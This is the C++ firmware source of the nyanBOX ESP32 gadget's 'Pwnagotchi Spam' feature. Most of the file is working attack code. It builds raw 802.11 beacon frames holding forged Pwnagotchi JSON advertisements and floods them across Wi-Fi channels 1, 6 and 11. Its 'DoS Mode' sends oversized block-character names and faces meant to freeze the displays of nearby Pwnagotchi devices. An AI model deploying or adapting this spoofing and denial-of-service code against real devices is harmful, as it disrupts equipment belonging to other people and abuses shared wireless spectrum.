/*
    nyanBOX by Nyan Devices
    https://github.com/jbohack/nyanBOX
    Copyright (c) 2025 jbohack

    Licensed under the MIT License
    https://opensource.org/licenses/MIT

    SPDX-License-Identifier: MIT
*/

#include "../include/pwnagotchi_spam.h"
#include "../include/sleep_manager.h"
#include "../include/display_mirror.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include <ArduinoJson.h>

extern U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2;

static bool spamActive = false;
static unsigned long lastBeacon = 0;
static unsigned long beaconsSent = 0;
static unsigned long startTime = 0;
static int currentFaceIndex = 0;
static int currentNameIndex = 0;
static int currentChannel = 0;
static bool wifiInitialized = false;

enum SpamMode { NORMAL_MODE, RANDOM_MODE, DOS_MODE };
static SpamMode currentMode = NORMAL_MODE;

const uint8_t channels[] = {1, 6, 11};
const int numChannels = sizeof(channels) / sizeof(channels[0]);

// Beacon frame template
const uint8_t beacon_frame_template[] = {
    0x80, 0x00,                                     // Frame control
    0x00, 0x00,                                     // Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,             // Destination address (broadcast)
    0xde, 0xad, 0xbe, 0xef, 0xde, 0xad,             // Source address (SA)
    0xde, 0xad, 0xbe, 0xef, 0xde, 0xad,             // BSSID
    0x00, 0x00,                                     // Sequence/fragment number
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
    0x64, 0x00,                                     // Beacon interval
    0x11, 0x04                                      // Capability information
};

const char* faces[] = {
    "(◕‿‿◕)",
    "(⌐■_■)",
    "(╯°□°)╯",
    "(ಠ_ಠ)",
    "(¬‿¬)",
    "( ͡° ͜ʖ ͡°)",
    "(☉_☉)",
    "(◉_◉)",
    "(≖‿≖)",
    "(◔‿◔)",
    "(UwU)",
    "(>_<)",
    "nyanBOX!~"
};

// Pwnagotchi names
const char* names[] = {
    "nyanBOX!~",
    "nyandevices.com",
    "jbohack was here",
    "zRCrackiin was here",
    "Sub to TalkingSasquach",
    "Don't be a skid",
    "FBI surveillance van",
    "Waifu.AI has stopped",
    "Hack the planet!",
    "Trust no one",
    "Definitely not a robot"
};

const int numFaces = sizeof(faces) / sizeof(faces[0]);
const int numNames = sizeof(names) / sizeof(names[0]);

const char randomChars[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!@#$%^&*()_+-=[]{}|;:,.<>?";
const int numRandomChars = sizeof(randomChars) - 1;

static bool needsRedraw = true;
static bool lastSpamActive = false;
static SpamMode lastMode = NORMAL_MODE;
static unsigned long lastBeaconsSent = 0;
static unsigned long lastPeriodicUpdate = 0;
const unsigned long periodicUpdateInterval = 1000;

// DoS faces (freeze screen)
const char* dosFace = "■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■";
const char* dosName = "■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■";

String generateRandomIdentity() {
    const char hex_chars[] = "0123456789abcdef";
    String identity = "";

    for (int i = 0; i < 64; ++i) {
        identity += hex_chars[random(0, 16)];
    }

    return identity;
}

String generateRandomSessionId() {
    const char hex_chars[] = "0123456789abcdef";
    String sessionId = "";
    
    for (int i = 0; i < 6; ++i) {
        if (i > 0) sessionId += ":";
        sessionId += hex_chars[random(0, 16)];
        sessionId += hex_chars[random(0, 16)];
    }

    return sessionId;
}

String generateRandomVersion() {
    int major = random(1, 3);
    int minor = random(0, 15);
    int patch = random(0, 10);
    
    return String(major) + "." + String(minor) + "." + String(patch);
}

String generateRandomName() {
    int nameLength = random(6, 13);
    String randomName = "";
    
    for (int i = 0; i < nameLength; i++) {
        randomName += randomChars[random(0, numRandomChars)];
    }
    
    return randomName;
}

String generateRandomGridVersion() {
    int major = 1;
    int minor = random(8, 15);
    int patch = random(0, 5);
    
    return String(major) + "." + String(minor) + "." + String(patch);
}

void sendPwnagotchiBeacon(uint8_t channel, const char* face, const char* name) {
    JsonDocument json;
    json["pal"] = true;
    json["name"] = name;
    json["face"] = face;
    json["epoch"] = 1;
    json["grid_version"] = generateRandomGridVersion();
    json["identity"] = generateRandomIdentity();
    json["pwnd_run"] = random(0, 100);
    json["pwnd_tot"] = random(0, 1000);
    json["session_id"] = generateRandomSessionId();
    json["timestamp"] = millis();
    json["uptime"] = millis() - startTime;
    json["version"] = generateRandomVersion();
    json["policy"]["advertise"] = true;
    json["policy"]["bond_encounters_factor"] = 20000;
    json["policy"]["bored_num_epochs"] = 0;
    json["policy"]["sad_num_epochs"] = 0;
    json["policy"]["excited_num_epochs"] = 9999;

    String json_str;
    serializeJson(json, json_str);

    uint16_t json_len = json_str.length();
    uint8_t header_len = 2 + ((json_len / 255) * 2);
    uint8_t beacon_frame[sizeof(beacon_frame_template) + json_len + header_len];
    memcpy(beacon_frame, beacon_frame_template, sizeof(beacon_frame_template));

    int frame_byte = sizeof(beacon_frame_template);
    for (int i = 0; i < json_len; i++) {
        if (i == 0 || i % 255 == 0) {
            beacon_frame[frame_byte++] = 0xde;
            uint8_t payload_len = 255;
            if (json_len - i < 255) {
                payload_len = json_len - i;
            }
            beacon_frame[frame_byte++] = payload_len;
        }
        beacon_frame[frame_byte++] = (uint8_t)json_str[i];
    }

    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_80211_tx(WIFI_IF_AP, beacon_frame, sizeof(beacon_frame), false);
    beaconsSent++;
}

void pwnagotchiSpamSetup() {
    wifi_mode_t currentWifiMode;
    if (esp_wifi_get_mode(&currentWifiMode) == ESP_OK) {
        esp_wifi_disconnect();
        esp_wifi_stop();
        wifiInitialized = true;
    } else {
        wifiInitialized = false;
    }

    if (!wifiInitialized) {
        wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
        esp_wifi_init(&cfg);
    }

    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    esp_wifi_set_mode(WIFI_MODE_AP);
    esp_wifi_start();

    spamActive = false;
    beaconsSent = 0;
    startTime = millis();
    currentFaceIndex = 0;
    currentNameIndex = 0;
    currentChannel = 0;
    currentMode = NORMAL_MODE;

    needsRedraw = true;
    lastSpamActive = false;
    lastMode = NORMAL_MODE;
    lastBeaconsSent = 0;
    lastPeriodicUpdate = 0;
}

void pwnagotchiSpamLoop() {
    unsigned long now = millis();

    if (digitalRead(BUTTON_PIN_UP) == LOW) {
        spamActive = !spamActive;
        needsRedraw = true;
        delay(200);
    }

    if (digitalRead(BUTTON_PIN_DOWN) == LOW) {
        currentMode = static_cast<SpamMode>((currentMode + 1) % 3);
        needsRedraw = true;
        delay(200);
    }

    unsigned long spamDelay = 200;

    if (spamActive && (now - lastBeacon >= spamDelay)) {
        switch (currentMode) {
            case NORMAL_MODE:
                sendPwnagotchiBeacon(channels[currentChannel],
                                   faces[currentFaceIndex],
                                   names[currentNameIndex]);
                currentFaceIndex = (currentFaceIndex + 1) % numFaces;
                currentNameIndex = (currentNameIndex + 1) % numNames;
                break;

            case RANDOM_MODE:
                {
                    String randomName = generateRandomName();
                    sendPwnagotchiBeacon(channels[currentChannel],
                                       faces[random(numFaces)],
                                       randomName.c_str());
                }
                break;

            case DOS_MODE:
                sendPwnagotchiBeacon(channels[currentChannel], dosFace, dosName);
                break;
        }

        currentChannel = (currentChannel + 1) % numChannels;
        lastBeacon = now;
    }

    if (lastSpamActive != spamActive) {
        lastSpamActive = spamActive;
        needsRedraw = true;
    }
    if (lastMode != currentMode) {
        lastMode = currentMode;
        needsRedraw = true;
    }
    if (lastBeaconsSent != beaconsSent) {
        lastBeaconsSent = beaconsSent;
        needsRedraw = true;
    }

    if (spamActive && now - lastPeriodicUpdate >= periodicUpdateInterval) {
        lastPeriodicUpdate = now;
        needsRedraw = true;
    }

    if (!needsRedraw) {
        delay(50);
        return;
    }

    needsRedraw = false;
    u8g2.clearBuffer();

    u8g2.setFont(u8g2_font_helvB10_tr);
    const char* title = "Pwnagotchi Spam";
    int titleWidth = u8g2.getUTF8Width(title);
    u8g2.drawStr((128 - titleWidth) / 2, 12, title);
    u8g2.drawHLine(10, 15, 108);

    u8g2.setFont(u8g2_font_helvB08_tr);
    const char* status = spamActive ? "ACTIVE" : "STOPPED";
    int statusWidth = u8g2.getUTF8Width(status);
    u8g2.drawStr((128 - statusWidth) / 2, 26, status);

    u8g2.setFont(u8g2_font_helvR08_tr);
    const char* mode;
    switch (currentMode) {
        case NORMAL_MODE: mode = "Normal"; break;
        case RANDOM_MODE: mode = "Random"; break;
        case DOS_MODE: mode = "DoS Mode"; break;
    }
    int modeWidth = u8g2.getUTF8Width(mode);
    u8g2.drawStr((128 - modeWidth) / 2, 36, mode);

    char statsText[32];
    snprintf(statsText, sizeof(statsText), "Sent: %lu", beaconsSent);
    int statsWidth = u8g2.getUTF8Width(statsText);
    u8g2.drawStr((128 - statsWidth) / 2, 46, statsText);

    u8g2.setFont(u8g2_font_4x6_tr);
    const char* line1 = "UP=Start/Stop  DOWN=Mode";
    const char* line2 = "SEL=Exit";

    int line1Width = u8g2.getUTF8Width(line1);
    int line2Width = u8g2.getUTF8Width(line2);

    u8g2.drawStr((128 - line1Width) / 2, 56, line1);
    u8g2.drawStr((128 - line2Width) / 2, 64, line2);

    u8g2.sendBuffer();
    displayMirrorSend(u8g2);

    delay(50);
}